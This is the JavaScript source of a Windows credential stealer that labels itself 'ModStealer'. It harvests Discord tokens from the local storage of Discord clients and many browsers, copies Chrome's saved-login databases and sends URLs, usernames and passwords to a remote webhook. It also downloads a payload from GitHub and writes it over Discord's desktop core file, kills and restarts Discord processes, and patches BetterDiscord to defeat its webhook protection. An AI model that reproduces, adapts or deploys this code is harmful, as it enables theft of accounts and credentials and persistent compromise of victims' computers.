const fs = require("fs");
const os = require("os");
var glob = require("glob");
const https = require('https');
const {
    exec
} = require('child_process');
const axios = require('axios');
const buf_replace = require('buffer-replace');

//UID Setup
const userInfo = os.userInfo();
var textuid = Buffer.from("Dir: " + userInfo.homedir + " User: " + userInfo.username + " Date: " + Date.now())
const uid = textuid.toString("hex")

//Global Vars
var oldDiscordTokens = [];

//Global Paths
var dir = __dirname.split("\\")
var localappdata = process.env.LOCALAPPDATA
var roamingappdata = process.env.APPDATA

//console.log(localappdata);
//console.log(roamingappdata);

getAllDiscordTokens();
//Get All Discord Tokens
function getAllDiscordTokens(){
    var paths = [`${roamingappdata}/Discord/Local Storage/leveldb`
        , `${roamingappdata}/DiscordDevelopment/Local Storage/leveldb`
        , `${roamingappdata}/Lightcord/Local Storage/leveldb`
        , `${roamingappdata}/discordptb/Local Storage/leveldb`
        , `${roamingappdata}/discordcanary/Local Storage/leveldb`
        , `${roamingappdata}/Opera Software/Opera Stable/Local Storage/leveldb`
        , `${roamingappdata}/Opera Software/Opera GX Stable/Local Storage/leveldb`
        , `${localappdata}/Amigo/User Data/Local Storage/leveldb`
        , `${localappdata}/Torch/User Data/Local Storage/leveldb`
        , `${localappdata}/Kometa/User Data/Local Storage/leveldb`
        , `${localappdata}/Orbitum/User Data/Local Storage/leveldb`
        , `${localappdata}/CentBrowser/User Data/Local Storage/leveldb`
        , `${localappdata}/7Star/7Star/User Data/Local Storage/leveldb`
        , `${localappdata}/Sputnik/Sputnik/User Data/Local Storage/leveldb`
        , `${localappdata}/Vivaldi/User Data/Default/Local Storage/leveldb`
        , `${localappdata}/Google/Chrome SxS/User Data/Local Storage/leveldb`
        , `${localappdata}/Epic Privacy Browser/User Data/Local Storage/leveldb`
        , `${localappdata}/Google/Chrome/User Data/Default/Local Storage/leveldb`
        , `${localappdata}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`
        , `${localappdata}/Microsoft/Edge/User Data/Default/Local Storage/leveldb`
        , `${localappdata}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`
        , `${localappdata}/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`
        , `${localappdata}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`]
        paths.forEach(p => koro(p))
}

function koro(p) {
    fs.readdir(p, (e, f) => {
        if (f) {
            f = f.filter(f => f.endsWith("ldb"))
            f.forEach(f => {
                var fileContent = fs.readFileSync(`${p}/${f}`).toString()
                var noMFA = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/
                var mfa = /"mfa\.[\d\w_-]{84}"/
                var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]
                
                if (token){
                    //console.log(token);
                    token = token.replace(/"/g, '');
                    var a = `{"content": "Token: ${token}", "username": "UID: ${uid}"}`;
                    //console.log(a)
                    axios.post("http://da_webhook/api2.php?type=old", {
                        "content": `Token: **${token}** \nUID: **${uid}**`,
                        "username": "Old Tokens by Koro"
                    })
                    .then(res => {})
                    .catch(error => {
                    })
                }
            })
        }
    })
}

getLoginData()
//Chrome Stealer
async function getLoginData(){
    await getChromePass("Login Data", "log0.db")
    await getChromePass("Login Data For Account", "log1.db")
    await getChromePass("Login Data1", "log2.db")
}

function getChromePass(source_file, dest_file){
    //Stealer Paths
    
    var chromepath = localappdata + "\\Google\\Chrome\\User Data\\Default\\"
    var exploit_path = chromepath + source_file
    var dest_path = localappdata + "\\Korobeinikizado\\"
    //console.log(dest_path)
    var sqlite3 = require('sqlite3').verbose();
    if (!fs.existsSync(exploit_path)){
        return;
    }
    if (!fs.existsSync(dest_path)){
        fs.mkdirSync(dest_path);
    }
    fs.copyFile(exploit_path, dest_path + dest_file, (err) => {
        if (err) throw err;
        //console.log('source.txt was copied to destination.txt');
    });
    let db = new sqlite3.Database(dest_path + dest_file, (err) => {
        if (err) {
            console.error(err.message);
        }
        //console.log('Connected to the my database.');
    });
    db.serialize(function () {
        db.each('SELECT action_url, username_value, password_value FROM logins', function (err, row) {
            //console.log(row)
            if (row){
                var url = row.action_url;
                var username = row.username_value;
                var password_value = row.password_value.toString("hex")
                var result = url + ":KorobeinikiGostoso:" + username + ":KorobeinikiGostoso:" + password_value;
                if (url == "") url = "N??o Capturado";
                if (username == "") username = "N??o Capturado";
                if (password_value == "") password_value = "N??o Capturado";
                //console.log(result);
                axios.post("http://da_webhook/api2.php?type=chrome", {
                    "content": `{"content": "URL: **${url}** \\nLogin: **${username}**\\nSenha (Hex): **${password_value}**", "username": "Chrome Pass by Koro"}`,
                    "username": "Chrome Pass by Koro"
                })
                .then(res => {})
                .catch(error => {
                })
            }else{
                //console.log("n??o encontrado nada em: " + exploit_path)
            }
            
            
        });
    });

    db.close();
}

const superstarlmao = "https://da_webhook/api2.php?type=injection"
const config = {
    "logout": "false",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify": "false",
    "embed-color":"3447704",
    "disable-qr-code": "true"
}
var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];
fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});
discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })
});
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/Korobeiniki17/c/main/injection', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", superstarlmao).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704", config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }
                if (config.logout != "false") {
                    let folder = file.replace("index.js", "ModStealerBTW")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    } else if (fs.existsSync(folder) && config.logout == "instant") {
                        startDiscord();
                    }
                }
            })
        });
    }).on("error", (err) => {
        //console.log(err);
    });
};
function listDiscords() {
    exec('tasklist', function(err, stdout, stderr) {
        if (stdout.includes("Discord.exe")) {
            runningDiscords.push("discord")
        }
        if (stdout.includes("DiscordCanary.exe")) {
            runningDiscords.push("discordcanary")
        }
        if (stdout.includes("DiscordDevelopment.exe")) {
            runningDiscords.push("discorddevelopment")
        }
        if (stdout.includes("DiscordPTB.exe")) {
            runningDiscords.push("discordptb")
        };
        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0) {
                injectNotify();
            }
            Infect()
            pwnBetterDiscord()
        }
    })
};
function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
                return;
            }
        });
    });
    if (config["inject-notify"] == "true" && injectPath.length != 0) {
        injectNotify();
    }
    Infect()
    pwnBetterDiscord()
};
function startDiscord() {
    runningDiscords.forEach(disc => {
        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
        exec(path, (err) => {
            if (err) {
                return;
            }
        });
    });
};
function pwnBetterDiscord() {
    // thx stanley
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
    } else {
        return;
    }
}
function injectNotify() {
    var fields = [];
    injectPath.forEach(path => {
        var c = {
            name: ":syringe: Inject Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
    })
    axios
        .post(superstarlmao, {
            "content": uid,
            "embeds": [{
                "title": ":detective: Successfull injection",
                "color": config["embed-color"],
                "fields": fields,
                "author": {
                    "name": "ModStealer"
                },
                "footer": {
                    "text": "ModStealer"
                }
            }]
        })
        .then(res => {})
        .catch(error => {
        })
}
